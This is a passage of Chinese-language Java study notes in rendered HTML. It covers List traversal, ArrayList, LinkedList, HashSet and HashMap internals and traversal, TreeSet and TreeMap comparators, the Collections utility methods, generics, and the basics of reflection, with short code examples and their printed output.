urm4]</span><br></code></pre></td></tr></table></figure><h2 id="List-遍历"><a href="#List-遍历" class="headerlink" title="List 遍历"></a>List 遍历</h2><ul><li>适用于所有实现子类</li></ul><p>迭代器遍历</p><ul><li><p>Iterator 对象为迭代器，用于遍历 Collection 集合的元素</p></li><li><p>实现 Collection 接口的集合类都有 iterator( ) 方法，返回一个迭代器</p></li><li><p>Iterator 结构</p></li><li><p>Iterator 仅用于遍历集合，Iterator 本身并不存放对象</p></li><li><p>快捷输入 itit</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Iterator iterator=list.iterator();<br>    Object next=iterator.next();<br>    System.out.println(next);       <span class="hljs-comment">//javass</span><br>        <br>    Object next2=iterator.next();<br>    System.out.println(next2);          <span class="hljs-comment">//javass2</span><br>        <br>    System.out.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm2, urm]</span><br><span class="hljs-comment">//相当于指针</span><br></code></pre></td></tr></table></figure></li></ul><p>增强 for 循环</p><ul><li>实际上还是迭代器遍历</li><li>快捷输入 iter&#x2F;xxx.for</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Object o : list) &#123;<br>   System.out.println(o);<br>&#125;<br>        <br><span class="hljs-comment">//javass</span><br>javass2<br>urm2<br>rr2<br>urm<br>java<br>rr<br>urm2<br>urm<br></code></pre></td></tr></table></figure><p>for 循环</p><ul><li>xxx.for</li><li>前提有索引</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>    System.out.println(list.get(i));<br>&#125;<br><span class="hljs-comment">//有索引</span><br></code></pre></td></tr></table></figure><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><ul><li>由数组实现数据存储</li><li>Vector 和 ArrayList 基本相同，Vector 线程安全，ArrayList 执行效率高</li></ul><p>ArrayList 扩容机制</p><ul><li>有一个 Object 类型的数组 elementData，存放元素 transient Object [ ] elementData</li><li>指定大小构造器</li></ul><h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><ul><li>对象数组存放元素，protected Object [ ]  elementData</li><li>指定扩容个数        new Vector(10,3)</li></ul><h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><ul><li>双向链表，有两个属性 first 和 last 分别指向首节点和尾节点</li><li>每个节点（Node 对象）里面有 prev 、next、item三个属性，item 存放元素，prev 指向前一个节点，next 指向后一个节点</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java">   Node java= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>       Node rw=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;rw&quot;</span>);<br>       Node urm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>       java.next=rw;<br>       rw.next=urm;<br>       <br>       urm.prev=rw;<br>       rw.prev=java;<br>       <br>       Node first=java;<br>       Node last=urm;<br>       <br>       Node temp=first;<br>       <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>           System.out.println(temp);<br>           temp=temp.next;<br>       &#125;<br>        <br>        temp=last;<br>        <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(temp);<br>            temp=temp.prev;<br>        &#125;<br>    <br>    &#125;<br>   <br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&#123;<br>    <span class="hljs-keyword">public</span> Node prev;<br>    <span class="hljs-keyword">public</span> Node next;<br>    <span class="hljs-keyword">public</span> Object item;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Node</span><span class="hljs-params">(Object item)</span> &#123;<br>        <span class="hljs-built_in">this</span>.item = item;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Node&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;item=&quot;</span> + item +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Node&#123;item=java&#125;</span><br>Node&#123;item=rw&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=rw&#125;<br>Node&#123;item=java&#125;<br></code></pre></td></tr></table></figure><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><ul><li><p>无序，没有索引，但是输出顺序固定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">HashSet hashSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>    hashSet.add(<span class="hljs-string">&quot;java&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;abc&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;def&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;javsdv&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;rw&quot;</span>);<br>    System.out.println(hashSet);<br><span class="hljs-comment">//[java, abc, def, rw, javsdv]</span><br></code></pre></td></tr></table></figure></li><li><p>不允许重复元素，最多包含一个 null</p></li><li><p>Set 接口是 Collection 子接口，常用方法和 Collection 一样</p></li><li><p>Set 接口遍历方式</p><ul><li>迭代器遍历</li><li>增强 for 遍历</li><li>不能用索引来获取，无法使用普通 for 遍历</li></ul></li></ul><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><ul><li><p>实际上是 HashMap</p></li><li><p>无序，取决于 hash 后，确定索引结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"> HashSet set=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>    System.out.println(set.add(<span class="hljs-string">&quot;java&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;abc&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;def&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;java&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-literal">null</span>));<br>    set.remove(<span class="hljs-string">&quot;def&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;set&quot;</span>+set);<br><span class="hljs-comment">//true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">false</span><br>truej<br>set[<span class="hljs-literal">null</span>, java, abc]<br></code></pre></td></tr></table></figure></li></ul><p><strong>add 进行的操作</strong></p><ul><li>HashMap 底层是（数组 + 链表 + 红黑树）</li><li>添加一个元素时，先得到 hash 值，然后转化为索引值</li><li>找到存储数据表 table ，看这个索引位置是否已经存放元素，没有就直接加入，有就调用 equals 比较，相同就放弃添加，不同就添加到最后</li><li>如果一条链表元素个数&gt;&#x3D;8,table &gt;&#x3D;64，进行树华</li><li>如果链表没达到 8 ，table 没到 64，先进行数组扩容</li><li>加入 HashMap 中的元素，是否相同由 HashCode 和 equals 方法决定</li></ul><h2 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h2><ul><li>不允许添加重复元素，是HashSet子类，底层是 LinkedHashMap</li><li>遍历顺序和添加顺序一致</li><li>存放元素方式和 HashSet 相同，在此基础上又维护了一个双向链表</li></ul><h2 id="Map-接口"><a href="#Map-接口" class="headerlink" title="Map 接口"></a>Map 接口</h2><ul><li>与 Collection 并列存在。用于保存具有映射关系的数据：Key - Value （双列集合）</li><li>key 和 value 可以是任何引用数据类型，会封装到 HashMap$Node 对象中</li><li>key 不能重复，key 一样时，新的值会替换旧的，value可以重复</li><li>key 可以为 null （只能一个），value 可以为 null (可以多个)</li><li>key 和 value 为单向一对一关系，通过指定 key 可以找到对应的 value</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">  Map hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    hashMap.put(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;word&quot;</span>);<br>    Integer integer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(integer,<span class="hljs-literal">null</span>);<br>        <br>    System.out.println(hashMap);<br><span class="hljs-comment">//&#123;100=null, pass=word, user=bb&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Map hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    hashMap.put(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;word&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;me&quot;</span>);<br>    Integer integer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(integer,<span class="hljs-literal">null</span>);<br>    hashMap.remove(<span class="hljs-string">&quot;user&quot;</span>);<br>    System.out.println(hashMap.get(<span class="hljs-string">&quot;pass&quot;</span>));<br>    System.out.println(hashMap.size());<br>    System.out.println(hashMap.isEmpty());<br>    System.out.println(hashMap.containsKey(<span class="hljs-string">&quot;admin&quot;</span>));<br>    System.out.println(hashMap);<br><span class="hljs-comment">//word</span><br><span class="hljs-number">3</span><br><span class="hljs-literal">false</span><br><span class="hljs-literal">true</span><br>&#123;<span class="hljs-number">100</span>=<span class="hljs-literal">null</span>, pass=word, admin=me&#125;<br></code></pre></td></tr></table></figure><h2 id="HashMap-遍历"><a href="#HashMap-遍历" class="headerlink" title="HashMap 遍历"></a>HashMap 遍历</h2><ul><li><p>取出所有的 Key ，通过 key 获取 value</p><ul><li><p>加强 for循环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Set keyset=hashMap.keySet();<br><span class="hljs-keyword">for</span>(Object key:keyset)&#123;<br>    System.out.println(key+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(key));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>迭代器遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Iterator iterator=set.iterator();<br><span class="hljs-keyword">while</span>(iterator.hasNext())&#123;<br>Object keyset=iterator.next();<br>System.out.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">Set</span> <span class="hljs-variable">keysset</span> <span class="hljs-operator">=</span>hashMap.keySet();<br> keysset.forEach(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Consumer</span>() &#123;<br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Object keyset)</span> &#123;<br>         System.out.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>取出所有的 value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection values=hashMap.values();<br><span class="hljs-keyword">for</span>(Object value:values)&#123;<br>      System.out.println(value);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>通过 EntrySet 来获取 K-V</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Set entrySet=hashMap.entrySet();<br> <span class="hljs-keyword">for</span> (Object keyset:entrySet)&#123;<br> Map.Entry entry=(Map.Entry)keyset;<br>        System.out.println(entry.getKey()+<span class="hljs-string">&quot;-&quot;</span>+entry.getValue());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Key-Value 存放</p></li><li><p>keySet 和 values 返回类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Set set=map.keySet();<br>System.out.println(set.getClass());<br>Collection values=map.values();<br>System.out.println(values.getClass());<br></code></pre></td></tr></table></figure></li></ul><h2 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2><ul><li>存放键值对：K-V</li><li>键值不能为 null</li><li>使用方法和 HashMap 差不多一样</li></ul><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><ul><li>继承自 Hashtable 类</li><li>用法和 hashmap 一样，键值不能为 null</li></ul><h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><ul><li><p>如果比较结果器为 0 ，数据不会加入到 TreeSet</p></li><li><p>在构造器中，可以传入一个比较器，指定排序规则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet treeSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>            <span class="hljs-keyword">return</span> ((String)o2).compareTo((String)o1);<br>       &#125;<br>   &#125;);<br>   treeSet.add(<span class="hljs-string">&quot;abcd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;abc&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;abd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;cbd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;ebd&quot;</span>);<br>        <br>   System.out.println(treeSet);<br><span class="hljs-comment">//[ebd, cbd, abd, abcd, abc]        </span><br></code></pre></td></tr></table></figure></li></ul><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><ul><li>可以传入一个比较器，指定排序规则</li><li>如果比较器返回 0 ，则 key 不会加入到 TreeMap，值会替换</li></ul><h2 id="Collections-工具类"><a href="#Collections-工具类" class="headerlink" title="Collections 工具类"></a>Collections 工具类</h2><ul><li>是一个操作 Set、List 和 Map等集合的工具类，提供一系列静态方法</li></ul><h3 id="排序相关"><a href="#排序相关" class="headerlink" title="排序相关"></a>排序相关</h3><ul><li>reverse ( List ):反转 List 元素的顺序</li><li>shuffle ( List ) : 随机打乱</li><li>sort ( List ) : 按升序排序</li><li>sort (List,Comparator ) : 制定规则进行排序</li><li>swap ( List，int i，int  j ) : 将 i 和 j 处元素进行交换</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>    arrayList.add(<span class="hljs-number">100</span>);<br>    arrayList.add(<span class="hljs-number">200</span>);<br>    arrayList.add(<span class="hljs-number">300</span>);<br>    arrayList.add(<span class="hljs-number">400</span>);<br>    arrayList.add(<span class="hljs-number">500</span>);<br>    arrayList.add(<span class="hljs-number">600</span>);<br>    arrayList.add(<span class="hljs-number">700</span>);<br>    arrayList.add(<span class="hljs-number">800</span>);<br>    arrayList.add(<span class="hljs-number">900</span>);<br>    System.out.println(arrayList);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>     <br><span class="hljs-comment">//reverse(List):对 List 元素进行反转</span><br>    Collections.reverse(arrayList);<br>    System.out.println(arrayList);      <span class="hljs-comment">//[900, 800, 700, 600, 500, 400, 300, 200, 100]</span><br>        <br><span class="hljs-comment">//shuffle(List):对 List 集合元素进行随机打乱</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>        Collections.shuffle(arrayList);<br>          System.out.println(arrayList);<br>    &#125;<br>        <br><span class="hljs-comment">//sort(List):按升序排序</span><br>   Collections.sort(arrayList);<br>      System.out.println(arrayList);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>        <br><span class="hljs-comment">//swap(List,int,int):将指定 List 集合的 i 处元素和 j 处元素交换</span><br>   Collections.swap(arrayList,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br>      System.out.println(arrayList);      <span class="hljs-comment">//[100, 200, 300, 600, 500, 400, 700, 800, 900]</span><br></code></pre></td></tr></table></figure><h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><ul><li><p>Object max &#x2F; min（Collection &#x2F; Collecton，Comparator）：根据顺序 &#x2F; 指定规则返回最大 &#x2F; 小元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Object max=Collections.max(arrayList);<br>System.out.println(max);<br></code></pre></td></tr></table></figure></li><li><p>int frequency ( collection,Object ) :返回指定元素出现个数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> frequency=Collections.frequency(arrayList,<span class="hljs-number">500</span>);<br>System.out.println(frequency);<br></code></pre></td></tr></table></figure></li><li><p>void copy （List dest，List src）:将 src 内容复制到 dest 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList new_arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(arrayList.size());<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arrayList.size(); i++) &#123;<br>      new_arrayList.add(<span class="hljs-number">0</span>);  <br>   &#125;<br>  Collections.copy(new_arrayList,arrayList);<br>  System.out.println(new_arrayList);<br></code></pre></td></tr></table></figure></li><li><p>boolean replaceAll（List list，Object oldVal，Object newVal）：使用新值替换所有旧值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Collections.replaceAll(new_arrayList,<span class="hljs-number">200</span>,<span class="hljs-number">1000</span>);<br>System.out.println(new_arrayList);<br></code></pre></td></tr></table></figure></li></ul><h3 id="集合的使用和选择"><a href="#集合的使用和选择" class="headerlink" title="集合的使用和选择"></a>集合的使用和选择</h3><p><strong>判断需要存储数据类想</strong></p><ul><li>一组对象</li><li>一组键值对</li></ul><p><strong>一组对象（单列）：Collection 接口</strong></p><ul><li><p>允许重复：List</p><ul><li>增删多：LinkedList （底层是双向链表）</li><li>改查多：ArrayList（底层是 Object 类型的可变数组）</li></ul></li><li><p>不允许重复：Set</p><ul><li>无序：HashSet（底层是 HashMap，数组 + 链表 +红黑树）</li><li>排序：TreeSet</li><li>插入和取出顺序一致：LinkedHashSet（底层是数组 + 双向链表）</li></ul></li></ul><p><strong>一组键值对（双列）：Map 接口</strong></p><ul><li>键无序：HashMap（ 数组 + 链表 + 红黑树 ）</li><li>键排序：TreeMap</li><li>键插入和取出顺序一致：LinkedHashMap</li><li>读取文件：Properties</li></ul><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li><p>public class ArrayList&lt;E&gt;</p><p>………</p><p>&lt;E&gt;的 E 为泛型，随意表示</p></li><li><p>带一个或多个类型参数的类或接口</p></li></ul><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><ul><li>interface List&lt;T&gt;{ }</li><li>class HashMap&lt;K,V&gt;{ }</li><li>T、K、V 代表表示类型</li></ul><h2 id="泛型实例化"><a href="#泛型实例化" class="headerlink" title="泛型实例化"></a>泛型实例化</h2><ul><li>HashMap&lt;String，String&gt;   hashMap &#x3D; new HashMap&lt;&gt;( )；</li><li>Iterator&lt;Map.Entry&lt;String,String&gt;&gt;  iterator &#x3D; entries.iterator( )；</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();等价于 HashMap&lt;Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><h3 id="自定义泛型类"><a href="#自定义泛型类" class="headerlink" title="自定义泛型类"></a>自定义泛型类</h3><ul><li>不指定类型默认为 Object</li></ul><h3 id="自定义泛型接口"><a href="#自定义泛型接口" class="headerlink" title="自定义泛型接口"></a>自定义泛型接口</h3><ul><li>接口中静态成员不能使用泛型</li><li>类型在继承接口或类实现接口时确定</li></ul><h3 id="自定义泛型方法"><a href="#自定义泛型方法" class="headerlink" title="自定义泛型方法"></a>自定义泛型方法</h3><ul><li><p>带类型参数的方法</p></li><li><p>泛型方法可以定义在泛型和普通类里面。使用泛型的方法未定义泛型</p></li><li><p>可以使用自己声明的泛型，也可以使用类声明的泛型</p></li><li><p>在调用时会确定类型</p></li></ul><h3 id="泛型通配符-“-？”"><a href="#泛型通配符-“-？”" class="headerlink" title="泛型通配符 “ ？”"></a>泛型通配符 “ ？”</h3><ul><li><p>泛型没有继承</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Object&gt; list=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br></code></pre></td></tr></table></figure></li><li><p><code>&lt;?&gt;</code> : 支持任意泛型类型，任何类型的 List 对象</p></li><li><p><code>&lt;? extends A&gt;</code> : 接受 A 或 A 的子类，规定上限</p></li><li><p><code>&lt;? super A&gt; </code>: A 类或 A 的父类，规定下限</p></li></ul><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><ul><li>在不修改源码时，控制程序，不知道类结构情况下获取类的结构信息</li><li>可以突破访问修饰符的限制</li></ul><h2 id="Class-类的方法"><a href="#Class-类的方法" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><table><thead><tr><th>方法名</th><th>作用描述</th></tr></thead><tbody><tr><td>getName</td><td>获取全类名</td></tr><tr><td>getSimpleName</td><td>获取简单类名</td></tr><tr><td>getSuperClass</td><td>以 Class 形式返回父类信息</td></tr><tr><td>getInterface</td><td>以 Class [ ] 形式返回接口信息</td></tr><tr><td>getFiled &#x2F; getFields</td><td>获取 public 修饰的字段，包含本类和父类</td></tr><tr><td>getDeclaredFiled &#x2F; getDeclaredFileds</td><td>获取本类所有字段</td></tr><tr><td>getMethod &#x2F; getMethods</td><td>获取 public 修饰的方法，包含本类和父类</td></tr><tr><td>getDeclaredMethod &#x2F; getDeclaredMethods</td><td>获取本类所有方法（包括私有）</td></tr><tr><td>getConstructors</td><td>获取本类 public 修饰的构造器</td></tr><tr><td>getDeclearedConstructors</td><td>获取本类所有构造器</td></tr><tr><td>getPackage</td><td>以 Package 形式返回包信息</td></tr><tr><td>getAnnotations</td><td>以 Annotation 形式返回注解信息</td></tr><tr><td>getClass</td><td>得到运行类型</td></tr><tr><td>newInstance</td><td>创建对象</td></tr><tr><td>getClassLoader</td><td>得到类加载器</td></tr><tr><td>forName</td><td>得到类对象</td></tr></tbody></table><h2 id="Class-类对象获取方式"><a href="#Class-类对象获取方式" class="headerlink" title="Class 类对象获取方式"></a>Class 类对象获取方式</h2><ul><li>Class.forName ( … )</li><li>类.class用于参数传递</li><li>对象.getClass ( )</li><li>ClassLoader.loadClass ( … )</li><li>基本数据类型的 Class 类对象获取   int.class    Integer.TYPE</li><li>基本数据类型的 Class 类对象获取    Integer.class</li></ul><h2 id="Class-类对象"><a href="#Class-类对象" class="headerlink" title="Class 类对象"></a>Class 类对象</h2><ul><li>外部类</li><li>成员内部类，静态内部类，局部内部类，匿名内部类</li><li>interface：接口</li><li>数组</li><li>enum：枚举     Thread.State</li><li>annotation：注解</li><li>基本数据类型</li><li>void</li></ul><h2 id="Class-类的方法-1"><a href="#Class-类的方法-1" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><p>反射创造对象</p><ul><li>无参构造器</li><li>有参构造器</li><li>私有构造器</li></ul><p>反射操作属性</p><ul><li>获取属性</li><li>设置属性</li><li>私有属性</li><li>如果是静态属性，第一个参数可以给 